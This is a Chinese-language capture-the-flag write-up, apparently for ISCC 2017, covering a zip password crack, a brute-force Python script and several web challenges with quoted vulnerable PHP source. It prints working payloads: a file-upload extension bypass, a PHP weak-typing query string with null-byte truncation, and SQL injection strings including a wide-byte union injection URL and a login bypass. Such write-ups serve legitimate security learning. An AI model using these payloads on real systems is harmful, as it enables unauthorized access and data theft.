+<h3 id="再见李华"><a href="#再见李华" class="headerlink" title="再见李华"></a>再见李华</h3><p><img src="http://i2.muimg.com/588926/48ccd900e35934fa.png" alt=""><br><a href="http://pan.baidu.com/s/1sl4kPfn" target="_blank" rel="external">附件链接</a>： 密码：papu<br>附件中是一张图片，foremost将zip提出来，打开需要密码。<br>这个题目就略坑了，满满的都是脑洞，没有特殊字符，是指密码中没有特殊字符。而不少于<code>1000</code>个字，这个1000是8的二进制，所以密码是9位或9位以上，最后署名，意思是密码中后面5位数是Lihua。利用之前的脚本直接生成一个，但是<code>fcrackzip</code>抽风怎么都破解不出来。<br>最后用<code>Advanced ZIP Password Recovery_4.0</code>进行破解。<br>最后密码为<code>15CCLiHua</code><br>或者直接暴力破解吧，花的是时间。<br>附脚本：<br><img src="http://i4.buimg.com/588926/56dce94288c614e9.png" alt=""><br>flag为<code>Stay hungry, Stay foolish.</code></p>
+<h3 id="寻”文”启事"><a href="#寻”文”启事" class="headerlink" title="寻”文”启事"></a>寻”文”启事</h3><p><img src="https://ooo.0o0.ooo/2017/05/22/592302f03ce93.png" alt="1.png"><br><a href="http://pan.baidu.com/s/1boDQX4r" target="_blank" rel="external">附件链接</a>： 密码：tzli</p>
+<p>从<code>getflag.py</code>来看，需要5个32位的字符串，从所有的文本文件中找出了13个，进行排列。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</div><div class="line"></div><div class="line">ii = open(<span class="string">'ii.txt'</span>,<span class="string">'w'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuc_1</span><span class="params">()</span>:</span></div><div class="line">    s = set()</div><div class="line"></div><div class="line">    pattern = re.compile(<span class="string">r'[0-9a-f]&#123;32&#125;'</span>)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">6000</span>):</div><div class="line">        fname = <span class="string">'./data/%s.txt'</span> % i</div><div class="line">        </div><div class="line">        <span class="keyword">with</span> open(fname, <span class="string">'rt'</span>) <span class="keyword">as</span> fs:</div><div class="line">            tmp = fs.read()</div><div class="line">            match = pattern.match(tmp)</div><div class="line">            </div><div class="line">            <span class="keyword">if</span> match:</div><div class="line">                s.add(match.group())</div><div class="line">    </div><div class="line">    <span class="keyword">return</span> s</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuc_2</span><span class="params">(s)</span>:</span></div><div class="line">    </div><div class="line">    tmp = permutations(list(s), <span class="number">5</span>)</div><div class="line">    </div><div class="line">    <span class="keyword">for</span> a, b, c, d, e <span class="keyword">in</span> tmp:</div><div class="line">        fuc_c(a, b, c, d, e)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuc_c</span><span class="params">(a, b, c, d, e)</span>:</span></div><div class="line">    Flag = <span class="string">''</span></div><div class="line"></div><div class="line">    File1_rc = binascii.unhexlify(a)</div><div class="line">    File2_rc = binascii.unhexlify(b)</div><div class="line">    File3_rc = binascii.unhexlify(c)</div><div class="line">    File4_rc = binascii.unhexlify(d)</div><div class="line">    File5_rc = binascii.unhexlify(e)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">16</span>):</div><div class="line">        temp = ord(File1_rc[i]) + ord(File2_rc[i]) + ord(File3_rc[i]) + ord(File4_rc[i]) + ord(File5_rc[i])</div><div class="line">        Flag = Flag + chr((temp % <span class="number">255</span>))</div><div class="line"></div><div class="line">    jj = <span class="string">"Flag:&#123;"</span> + binascii.hexlify(Flag)+ <span class="string">"&#125;"</span></div><div class="line">    <span class="comment">#print "Flag:&#123;" + binascii.hexlify(Flag) + "&#125;"</span></div><div class="line">    <span class="keyword">print</span> jj</div><div class="line">    ii.write(jj+<span class="string">'\n'</span>)</div><div class="line">fuc_2(fuc_1())</div></pre></td></tr></table></figure></p>
+<p>最后的结果为1287个，但是没有正确的flag，求hit。</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="WelcomeToMySQL"><a href="#WelcomeToMySQL" class="headerlink" title="WelcomeToMySQL"></a>WelcomeToMySQL</h3><p><img src="http://i1.piimg.com/567571/2a463ee68264b48b.png" alt=""><br>测试后上传<code>php5</code>成功，查看源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">"file"</span>]))&#123;</div><div class="line">                <span class="keyword">if</span>(preg_match(<span class="string">"/\.php[2,3,4]$/"</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</div><div class="line">                        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("You are a good man")&lt;/script&gt;'</span>;</div><div class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/\.php$/"</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</div><div class="line">                        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("You are a good man")&lt;/script&gt;'</span>;</div><div class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/\.phtml$/"</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</div><div class="line">                        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("phtml does not work ")&lt;/script&gt;'</span>;</div><div class="line">                <span class="keyword">else</span> <span class="keyword">if</span>($file=$_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>])&#123;</div><div class="line">			move_uploaded_file($file, <span class="string">"/var/www/html/web-01/upload/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line">                        <span class="keyword">echo</span> <span class="string">"uploaded successfully!"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">			<span class="keyword">echo</span> <span class="string">'&lt;!--$servername,$username,$password,$db,$tb were set in base.php--&gt;'</span>;</div><div class="line">                        <span class="keyword">echo</span> <span class="string">"Your file stored in: "</span>.<span class="string">"upload/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line">                &#125;</div><div class="line">        &#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;html&gt;</div><div class="line">        &lt;body&gt;</div><div class="line">                &lt;form action=<span class="string">"index.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line">                        file:&lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> /&gt;&lt;br/&gt;</div><div class="line">                        &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"upload"</span> /&gt;</div><div class="line">                &lt;/form&gt;</div><div class="line">        &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>确实就还剩下常规的php5和pht没有没被限制。<br>根据提示的信息就是flag在数据库里面。用<code>cat base.php</code>读取配置从而进行连接。<br>flag：<code>Flag:{Iscc_1s_Fun_4nd_php_iS_Easy}</code></p>
+<h3 id="自相矛盾"><a href="#自相矛盾" class="headerlink" title="自相矛盾"></a>自相矛盾</h3><p><img src="http://i2.muimg.com/567571/039172265d7f00c3.png" alt=""><br>源码见到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">$v1=<span class="number">0</span>;$v2=<span class="number">0</span>;$v3=<span class="number">0</span>;</div><div class="line">$a=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'iscc'</span>]); </div><div class="line"></div><div class="line"><span class="keyword">if</span>(is_array($a))&#123;</div><div class="line">    is_numeric(@$a[<span class="string">"bar1"</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">    <span class="keyword">if</span>(@$a[<span class="string">"bar1"</span>])&#123;</div><div class="line">        ($a[<span class="string">"bar1"</span>]&gt;<span class="number">2016</span>)?$v1=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(is_array(@$a[<span class="string">"bar2"</span>]))&#123;</div><div class="line">        <span class="keyword">if</span>(count($a[<span class="string">"bar2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</div><div class="line">        $pos = array_search(<span class="string">"nudt"</span>, $a[<span class="string">"bar2"</span>]);</div><div class="line">        $pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">foreach</span>($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">            $val===<span class="string">"nudt"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        $v2=<span class="number">1</span>;</div><div class="line"></div><div class="line">    &#125;	</div><div class="line">&#125;</div><div class="line">$c=@$_GET[<span class="string">'cat'</span>];</div><div class="line">$d=@$_GET[<span class="string">'dog'</span>];</div><div class="line"><span class="keyword">if</span>(@$c[<span class="number">1</span>])&#123;</div><div class="line">    <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</div><div class="line">		</div><div class="line">        eregi(<span class="string">"3|1|c"</span>,$d.$c[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">        strpos(($c[<span class="number">0</span>].$d), <span class="string">"isccctf2017"</span>)?$v3=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">		</div><div class="line">    &#125;</div><div class="line">	</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; </div><div class="line">   </div><div class="line">   <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>是有关弱类型的、弱类型的分析之前已经写过。</p>
+<p>可以看出iscc是一个jason对象。<br>bar1要求里边元素第一个比2016大而且不能是数字, 这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。 bar1为2017a即可<br>bar2是一个数组，长度是5，里边第一个元素是数组。bar2为[[0],0,1,2,3]即可</p>
+<p>而array和string进行strcmp比较的时候会返回一个null，%00可以截断eregi。cat[0]=00isccctf2017&amp;cat[1][]=1234&amp;dog=%00<br>最后提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?iscc=&#123;%22bar1%22:%222017e%22,%22bar2%22:[[1],1,2,3,0]&#125;&amp;cat[0]=00isccctf2017&amp;cat[1][]=1234&amp;dog=%00</div></pre></td></tr></table></figure></p>
+<p>flag为：<code>flag{sfklljljdstuaft}</code></p>
+<h3 id="I-have-a-jpg-i-upload-a-txt"><a href="#I-have-a-jpg-i-upload-a-txt" class="headerlink" title="I have a jpg,i upload a txt."></a>I have a jpg,i upload a txt.</h3><p><img src="https://ooo.0o0.ooo/2017/05/05/590c049461a67.png" alt="1.png"><br>代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt; </div><div class="line">&lt;body&gt; </div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="keyword">include</span> <span class="string">'hanshu.php'</span>; </div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>])) </div><div class="line">&#123; </div><div class="line">    $do=$_GET[<span class="string">'do'</span>]; </div><div class="line">    <span class="keyword">if</span>($do==upload) </div><div class="line">    &#123; </div><div class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) </div><div class="line">        &#123; </div><div class="line">            $html1=&lt;&lt;&lt;HTML1 </div><div class="line">            &lt;form action=<span class="string">"index.php?do=upload"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt; </div><div class="line">            &lt;input type=<span class="string">"file"</span> name=<span class="string">"filename"</span>&gt;                  </div><div class="line">            &lt;input type=<span class="string">"submit"</span> value=<span class="string">"upload"</span>&gt; </div><div class="line">            &lt;/form&gt; </div><div class="line">HTML1; </div><div class="line">            <span class="keyword">echo</span> $html1; </div><div class="line">        &#125; </div><div class="line">        <span class="keyword">else</span> </div><div class="line">        &#123;   $file=@file_get_contents($_FILES[<span class="string">"filename"</span>][<span class="string">"tmp_name"</span>]); </div><div class="line">            <span class="keyword">if</span>(<span class="keyword">empty</span>($file)) </div><div class="line">            &#123; </div><div class="line">                <span class="keyword">die</span>(<span class="string">'do you upload a file?'</span>); </div><div class="line">            &#125; </div><div class="line">            <span class="keyword">else</span> </div><div class="line">            &#123; </div><div class="line">                <span class="keyword">if</span>((strpos($file,<span class="string">'&lt;?'</span>)&gt;<span class="number">-1</span>)||(strpos($file,<span class="string">'?&gt;'</span>)&gt;<span class="number">-1</span>)||(stripos($file,<span class="string">'php'</span>)&gt;<span class="number">-1</span>)||(stripos($file,<span class="string">'&lt;script'</span>)&gt;<span class="number">-1</span>)||(stripos($file,<span class="string">'&lt;/script'</span>)&gt;<span class="number">-1</span>)) </div><div class="line">                &#123; </div><div class="line">                    <span class="keyword">die</span>(<span class="string">'you can\' upload this!'</span>); </div><div class="line">                &#125; </div><div class="line">                <span class="keyword">else</span> </div><div class="line">                &#123; </div><div class="line">                    $rand=mt_rand(); </div><div class="line">                    $path=<span class="string">'/var/www/html/web-03/uploads/'</span>.$rand.<span class="string">'.txt'</span>; </div><div class="line">                    file_put_contents($path, $file); </div><div class="line">                    <span class="keyword">echo</span> <span class="string">'your upload success!./uploads/'</span>.$rand.<span class="string">'.txt'</span>; </div><div class="line">                &#125; </div><div class="line">            &#125; </div><div class="line">             </div><div class="line">        &#125; </div><div class="line">         </div><div class="line">    &#125; </div><div class="line">    <span class="keyword">elseif</span>($do==rename) </div><div class="line">    &#123; </div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'re'</span>])) </div><div class="line">        &#123; </div><div class="line">            $re=$_GET[<span class="string">'re'</span>]; </div><div class="line">            $re2=@unserialize(base64_decode(unKaIsA($re,<span class="number">6</span>))); </div><div class="line">            <span class="keyword">if</span>(is_array($re2)) </div><div class="line">            &#123; </div><div class="line">                <span class="keyword">if</span>(count($re2)==<span class="number">2</span>) </div><div class="line">                &#123;    </div><div class="line">                    $rename=<span class="string">'txt'</span>; </div><div class="line">                    $rand=mt_rand(); </div><div class="line">                    $fp=fopen(<span class="string">'./uploads/'</span>.$rand.<span class="string">'.txt'</span>,<span class="string">'w'</span>); </div><div class="line">                    <span class="keyword">foreach</span>($re2 <span class="keyword">as</span> $key=&gt;$value) </div><div class="line">                    &#123; </div><div class="line">                        <span class="keyword">if</span>($key==<span class="number">0</span>) </div><div class="line">                        &#123; </div><div class="line">                            $rename=$value; </div><div class="line">                        &#125; </div><div class="line">                        <span class="keyword">else</span> </div><div class="line">                        &#123; </div><div class="line">                            <span class="keyword">if</span>(file_exists(<span class="string">'./uploads/'</span>.$value.<span class="string">'.txt'</span>)&amp;&amp;is_numeric($value)) </div><div class="line">                            &#123; </div><div class="line">                                $file=file_get_contents(<span class="string">'./uploads/'</span>.$value.<span class="string">'.txt'</span>); </div><div class="line">                                fwrite($fp,$file); </div><div class="line">                            &#125; </div><div class="line">                        &#125; </div><div class="line">                    &#125; </div><div class="line">                    fclose($fp); </div><div class="line">                    waf($rand,$rename); </div><div class="line">                    rename(<span class="string">'./uploads/'</span>.$rand.<span class="string">'.txt'</span>,<span class="string">'./uploads/'</span>.$rand.<span class="string">'.'</span>.$rename); </div><div class="line">                    <span class="keyword">echo</span> <span class="string">"you success rename!./uploads/$rand.$rename"</span>; </div><div class="line">                &#125; </div><div class="line">            &#125; </div><div class="line">            <span class="keyword">else</span> </div><div class="line">            &#123; </div><div class="line">                <span class="keyword">echo</span> <span class="string">'please not hack me!'</span>; </div><div class="line">            &#125; </div><div class="line">        &#125; </div><div class="line">        <span class="keyword">elseif</span>(<span class="keyword">isset</span>($_POST[<span class="string">'filetype'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) </div><div class="line">        &#123; </div><div class="line">            $filetype=$_POST[<span class="string">'filetype'</span>]; </div><div class="line">            $filename=$_POST[<span class="string">'filename'</span>]; </div><div class="line">            <span class="keyword">if</span>((($filetype==<span class="string">'jpg'</span>)||($filetype==<span class="string">'png'</span>)||($filetype==<span class="string">'gif'</span>))&amp;&amp;is_numeric($filename)) </div><div class="line">            &#123;    </div><div class="line">                $re=KaIsA(base64_encode(serialize(<span class="keyword">array</span>($filetype,$filename))),<span class="number">6</span>); </div><div class="line">                header(<span class="string">"Location:index.php?do=rename&amp;re=$re"</span>); </div><div class="line">                <span class="keyword">exit</span>(); </div><div class="line">            &#125; </div><div class="line">            <span class="keyword">else</span> </div><div class="line">            &#123; </div><div class="line">                <span class="keyword">echo</span> <span class="string">'you do something wrong'</span>; </div><div class="line">            &#125; </div><div class="line">        &#125; </div><div class="line">        <span class="keyword">else</span> </div><div class="line">        &#123; </div><div class="line">            $html2=&lt;&lt;&lt;HTML2 </div><div class="line">            &lt;form action=<span class="string">"index.php?do=rename"</span> method=<span class="string">"post"</span>&gt;           </div><div class="line">filetype: &lt;input type=<span class="string">"text"</span> name=<span class="string">"filetype"</span> /&gt; please input the your file<span class="string">'s type </span></div><div class="line"><span class="string">&lt;/br&gt; </span></div><div class="line"><span class="string">filename: &lt;input type="text" name="filename" /&gt; please input your file'</span>s numeric name,like <span class="number">12345678</span> </div><div class="line">&lt;/br&gt; </div><div class="line">&lt;input type=<span class="string">"submit"</span> /&gt; </div><div class="line">&lt;/form&gt; </div><div class="line">HTML2; </div><div class="line">            <span class="keyword">echo</span> $html2; </div><div class="line">             </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">     </div><div class="line">&#125; </div><div class="line"><span class="keyword">else</span> </div><div class="line">&#123;    </div><div class="line">    show_source(<span class="keyword">__FILE__</span>); </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span> </div><div class="line">&lt;/body&gt; </div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>这道题就做得吐血了。</p>
+<p>先来读一下代码</p>
+<h4 id="上传部分。"><a href="#上传部分。" class="headerlink" title="上传部分。"></a>上传部分。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if((strpos($file,&apos;&lt;?&apos;)&gt;-1)||(strpos($file,&apos;?&gt;&apos;)&gt;-1)||(stripos($file,&apos;php&apos;)&gt;-1)||(stripos($file,&apos;&lt;script&apos;)&gt;-1)||(stripos($file,&apos;&lt;/script&apos;)&gt;-1))</div></pre></td></tr></table></figure>
+<p>上传的里面不能包含有这一些参数，这里的办法就是拆开上传，比如是这样的。<br><img src="https://ooo.0o0.ooo/2017/05/06/590dd22924538.png" alt="1.png"><br>而接下来遇到的问题就是该如何合并这些参数。</p>
+<h4 id="rename部分"><a href="#rename部分" class="headerlink" title="rename部分"></a>rename部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$re2=@unserialize(base64_decode(unKaIsA($re,6)))</div><div class="line">&gt;&gt;&gt;&gt;&gt;</div><div class="line">$re=KaIsA(base64_encode(serialize(array($filetype,$filename))),6);</div></pre></td></tr></table></figure>
+<p>要算出那个加密串才行。而相对应的解密脚本为<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(string)</span>:</span></div><div class="line">    <span class="comment"># 获取凯撒位移6的加密内容</span></div><div class="line">    kaisa_6 = kaisa(string,<span class="number">6</span>)</div><div class="line">    <span class="comment"># 获取凯撒位移20的加密内容</span></div><div class="line">    kaisa_20 = kaisa(string,<span class="number">20</span>)</div><div class="line"></div><div class="line">    code = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,len(kaisa_6)):</div><div class="line">        kaisa_6_ord = ord(kaisa_6[x])</div><div class="line">        kaisa_20_ord = ord(kaisa_20[x])</div><div class="line"></div><div class="line">        <span class="comment">#判断凯撒位移20的是否是小写的值，是的话就加上</span></div><div class="line">        <span class="keyword">if</span> kaisa_20_ord &gt;= <span class="number">97</span> <span class="keyword">and</span> kaisa_20_ord &lt;= <span class="number">122</span>:</div><div class="line">            code += str(kaisa_20[x])</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            code += str(kaisa_6[x])</div><div class="line">    <span class="keyword">return</span> code</div></pre></td></tr></table></figure></p>
+<p>卡住了。</p>
+<p>大佬提示<code>foreach</code>是关键，又是一脸懵逼。再继续。<br><img src="https://ooo.0o0.ooo/2017/05/06/590ddee340102.png" alt="12.png"><br>这里就解决了开始分开上传的合并问题。<br>最后<br><img src="https://ooo.0o0.ooo/2017/05/06/590ddc3c951c1.png" alt="1.png"><br>flag为<code>flag{54a5bd4fe6193580020487b56acff6c5}</code><br>这道题主要还是这个加密的问题。<a href="http://pan.baidu.com/s/1mh8O3jy" target="_blank" rel="external">exp地址链接 </a> 密码：7lcu<br>最后附上一个比我这个好的<a href="http://amyang.xyz/post/ISCC-2017%20Web%20Writeup" target="_blank" rel="external">writeup</a></p>
+<h3 id="Web签到题，来和我换flag啊！"><a href="#Web签到题，来和我换flag啊！" class="headerlink" title="Web签到题，来和我换flag啊！"></a>Web签到题，来和我换flag啊！</h3><p><img src="http://i4.buimg.com/588926/25dae4b8f0805552.png" alt=""></p>
+<p>根据提示来就可以了。<br><img src="http://i4.buimg.com/588926/dc0a1c3542dcf00d.png" alt=""><br>flag为<code>f1ag: {N0w_go1Odo!otherw3b}</code></p>
+<h3 id="我们一起来日站"><a href="#我们一起来日站" class="headerlink" title="我们一起来日站"></a>我们一起来日站</h3><p><img src="http://i2.muimg.com/588926/3f67399745e8473d.png" alt=""><br>点击链接进去发现提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">老司机们平时都是怎么日站的呢？</div><div class="line"></div><div class="line">试着进入后台获取管理员权限吧。</div></pre></td></tr></table></figure></p>
+<p>看到老司机，那就先看下<code>robots.txt</code>。出现了<br><img src="http://i4.buimg.com/588926/4f6a4265ca4b5960.png" alt=""><br>里面这一串<code>md5</code>加密一看就是<code>admin</code><br>访问提示要继续寻找admin管理页面。<br>猜测是<code>admin.php</code>，就出现了后台登陆页面、<br>尝试弱口令，提示密码错误。尝试万能密码。<br><img src="http://i2.muimg.com/588926/560f104b8814acbf.png" alt=""><br>flag为<code>Flag:{ar32wefafafqw325t4rqfcafas}</code></p>
+<h3 id="where-is-your-flag"><a href="#where-is-your-flag" class="headerlink" title="where is your flag"></a>where is your flag</h3><p><img src="http://i2.muimg.com/588926/874ae02a1819118f.png" alt=""><br>使用sqlmap可以直接跑出来<br>或者手工。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://139.129.108.53:6980/web-08/?id=%df%27%20union%20select%201,unhex(hex(thisisflag))%20from%20flag%20limit%201--+</div></pre></td></tr></table></figure></p>
+<p>flag为<code>flag:{441b7fa1617307be9632263a4497871e}</code></p>
+<h3 id="Simple-sqli"><a href="#Simple-sqli" class="headerlink" title="Simple sqli"></a>Simple sqli</h3><p><img src="https://ooo.0o0.ooo/2017/05/23/5923fb7490f27.png" alt="捕获.PNG"><br>是一个登陆框，这道题加了验证码。<br>这种题目得常规的判断逻辑应该是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select username from admin where username=&apos;&apos;;</div></pre></td></tr></table></figure></p>
+<p>如果数据库中的密码和输入的密码一样则登陆成功<br>然后尝试<code>&#39;union select &#39;1&#39;#</code><br>提示密码错误。<br>再尝试<br><img src="https://ooo.0o0.ooo/2017/05/23/5923fbe3aed18.png" alt="捕获.PNG"><br>最后payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&apos;union select md5(1)#</div><div class="line">密码填写1</div></pre></td></tr></table></figure></p>
